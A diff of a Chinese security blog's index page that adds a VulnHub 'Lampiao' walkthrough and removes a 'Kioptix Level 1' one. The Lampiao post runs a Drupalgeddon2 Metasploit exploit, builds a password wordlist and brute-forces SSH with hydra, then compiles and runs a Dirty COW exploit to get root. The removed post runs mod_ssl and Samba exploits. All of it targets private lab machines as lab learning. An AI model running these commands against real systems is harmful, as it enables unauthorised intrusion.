@@ -284,6 +284,206 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/07/Lampiao/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Yasso🇨🇳">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2022/01/07/Lampiao/" itemprop="url">Lampiao</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2022-01-07T11:24:38+08:00">
+                2022-01-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Vulnhub%E7%B3%BB%E5%88%97/" itemprop="url" rel="index">
+                    <span itemprop="name">Vulnhub系列</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2022/01/07/Lampiao/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2022/01/07/Lampiao/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2022/01/07/Lampiao/" class="leancloud_visitors" data-flag-title="Lampiao">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  243
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  1
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p><strong>靶机：192.168.12.133<br>kali：192.168.12.128</strong></p>
+<h2 id="一、信息搜集"><a href="#一、信息搜集" class="headerlink" title="一、信息搜集"></a>一、信息搜集</h2><p><code>nmap -p- -sV 192.168.12.133</code><br><img src="https://img-blog.csdnimg.cn/5b9ed48c25aa4470a1004e069d88fff8.png" alt="请添加图片描述"><strong>访问80端口<br>一串乱码(没找到有用的信息)</strong><br><strong>访问1898端口</strong><br>$\color{red}{Drupal-CMS}$<br><img src="https://img-blog.csdnimg.cn/19daf187ae4949ceaa7b3ab5c0923fc3.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><code>http://192.168.12.133:1898/?q=node/2</code><br><strong>audio.m4a<br>qrc.png</strong><br><img src="https://img-blog.csdnimg.cn/f32c9b7df8974de6be73ff6f953f955b.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><code>wget http://192.168.12.133:1898/audio.m4a</code><br><code>wget http://192.168.12.133:1898/qrc.png</code></p>
+<p><strong>qrc.png:Try harder! muahuahua</strong><br><strong>audio.m4a:user tiago</strong><br><strong>用户名：tiago</strong></p>
+<h2 id="二、0x01-Getshell-Drupal-Drupalgeddon-2-远程代码执行漏洞"><a href="#二、0x01-Getshell-Drupal-Drupalgeddon-2-远程代码执行漏洞" class="headerlink" title="二、0x01 Getshell(Drupal Drupalgeddon 2 远程代码执行漏洞)"></a>二、0x01 Getshell(Drupal Drupalgeddon 2 远程代码执行漏洞)</h2><p><img src="https://img-blog.csdnimg.cn/78ad2be6912441faa30acb80a3bbf79d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><code>use exploit/unix/webapp/drupal_drupalgeddon2</code><br><code>set rhosts 192.168.12.133</code><br><code>set rport 1898</code><br><code>exploit</code><br><code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br><img src="https://img-blog.csdnimg.cn/2c2a36ee8e6a486898a35f67e3c877b7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"> </p>
+<h2 id="二、0x02-社工ssh密码爆破"><a href="#二、0x02-社工ssh密码爆破" class="headerlink" title="二、0x02 社工ssh密码爆破"></a>二、0x02 社工ssh密码爆破</h2><p><strong>得到用户名tiago且开放ssh端口</strong><br><code>cewl http://192.168.12.133:1898/?q=node/1 -w pwd.txt</code> <strong>生成字典</strong><br><code>hydra -l tiago -P pwd.txt 192.168.12.133 ssh</code> <strong>爆破</strong><br><img src="https://img-blog.csdnimg.cn/f13f14f501a84c3ab2535bb2c556700c.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><code>ssh tiago@192.168.12.133</code>  <strong>成功连接</strong><br><img src="https://img-blog.csdnimg.cn/18ff70f80ac242a5a5497d520434cf51.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
+<h2 id="三、脏牛提权"><a href="#三、脏牛提权" class="headerlink" title="三、脏牛提权"></a>三、<strong>脏牛提权</strong></h2><p><code>uname -a</code> <strong>查看内核版本</strong><br><img src="https://img-blog.csdnimg.cn/e008997c9ac54e6587f4c3c83028bc2c.png" alt="请添加图片描述"><br><img src="https://img-blog.csdnimg.cn/bc4977c4f22340d483bdcd8b3b5e6a90.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><br><strong>下载到桌面</strong><br><code>python -m SimpleHTTPServer 8000</code><br><code>wget http://192.168.12.128:8000/%E6%A1%8C%E9%9D%A2/40847.cpp</code><br><img src="https://img-blog.csdnimg.cn/501a03a7395a40edb4ef16625e46bf7e.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><code>head 40847.cpp</code> <strong>查看文件信息</strong><br><img src="https://img-blog.csdnimg.cn/3b7ea6d2bb7d4bdcb273129e700a8c47.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"><code>g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil</code> </p>
+<p><code>./dcow -s</code>  <strong>–成功root</strong><br><img src="https://img-blog.csdnimg.cn/0478137e8e8c467a80482ff344e1bce6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAe1lhc3NvfQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="请添加图片描述"></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/01/03/GoldenEye-v1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2283,227 +2483,13 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Yasso🇨🇳">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/" itemprop="url">Kioptix Level 1</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-12-02T19:49:25+08:00">
-                2021-12-02
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Vulnhub%E7%B3%BB%E5%88%97/" itemprop="url" rel="index">
-                    <span itemprop="name">Vulnhub系列</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/" class="leancloud_visitors" data-flag-title="Kioptix Level 1">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数&#58;</span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-            <div class="post-wordcount">
-              
-                
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-file-word-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">字数统计&#58;</span>
-                
-                <span title="字数统计">
-                  265
-                </span>
-              
-
-              
-                <span class="post-meta-divider">|</span>
-              
-
-              
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-clock-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
-                
-                <span title="阅读时长">
-                  1
-                </span>
-              
-            </div>
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p><em><strong><strong>靶机</strong>: 192.168.249.129<br><strong>kali</strong>: 192.168.249.132</strong></em></p>
-<h4 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h4><p> <code>arp-scan -l</code> —<strong>使用网络接口IP地址和网络掩码,生成目标主机地址列表</strong></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/1.png"></p>
-<p>靶机: 192.168.249.129</p>
-<p><code>nmap -sV 192.168.249.129</code> —<strong>查看开放端口</strong></p>
-<p><strong>信息</strong>:<font color="red"><strong>Apache/1.3.20、mod_ssl/2.8.4、OpenSSL/0.9.6b</strong></font></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/2.png"></p>
-<p><code>nikto -host http://192.168.249.129/</code> —<strong>开放80、443端口,深入探测</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/3.png"></p>
-<p>nikto扫到<font color="red"><strong>CVE-2002-0082(Apache Mod_SSL/Apache-SSL远程缓冲区溢出漏洞)</strong></font></p>
-<p><font color="red">443端口使用的mod_ssl服务版本为<strong>2.8.4</strong></font></p>
-<h4 id="二、0x01漏洞利用-mod-ssl-2-8-4"><a href="#二、0x01漏洞利用-mod-ssl-2-8-4" class="headerlink" title="二、0x01漏洞利用(mod_ssl-2.8.4)"></a>二、0x01漏洞利用(mod_ssl-2.8.4)</h4><p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/4.png"></p>
-<p><code>gcc -o exp 47080.c -lcrypto</code> —<strong>编译</strong></p>
-<p><code>./exp</code> —-<strong>查看下参数</strong></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/7.png"></p>
-<p><code>./exp | grep apache-1.3.20</code>  —-<strong>找对应的版本</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/5.png"></p>
-<p><strong>测试发现攻击偏移量0x6b可以利用</strong><br><code>./exp 0x6b 192.168.249.129 443 -c 40-50</code>  —<strong>root权限</strong></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/8.png"></p>
-<h4 id="三、0x02漏洞利用-Samba-2-2-1a"><a href="#三、0x02漏洞利用-Samba-2-2-1a" class="headerlink" title="三、0x02漏洞利用(Samba 2.2.1a)"></a>三、0x02漏洞利用(Samba 2.2.1a)</h4><p>msf对目标主机进行扫描，得到靶机smb版本为<strong>2.2.1a</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/9.png"></p>
-<p><code>searchsploit Samba 2.2</code> —<strong>找下有无可利用的漏洞</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/10.png"></p>
-<p><code>searchsploit -p 10.c</code> –<strong>寻找路径</strong><br><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/11.png"></p>
-<p><code>cp /usr/share/exploitdb/exploits/multiple/remote/10.c /root/桌面</code> –<strong>复制到桌面</strong></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/12.png"></p>
-<p><code>gcc -o samba 10.c</code>—<strong>编译运行</strong></p>
-<p><img src="/2021/12/02/Vulnhub%E7%B3%BB%E5%88%97-Kioptix-Level-1-1/13.png"></p>
-<p><strong>—–搞定—–</strong></p>
-
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/">&lt;i class&#x3D;&quot;fa fa-angle-right&quot;&gt;&lt;&#x2F;i&gt;</a>
+  </nav>
+
 
 
           </div>
@@ -2551,7 +2537,7 @@
               
                 <a href="/archives">
               
-                  <span class="site-state-item-count">10</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -2634,7 +2620,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">3.4k</span>
+    <span title="Site words total count">3.6k</span>
   
 </div>
 
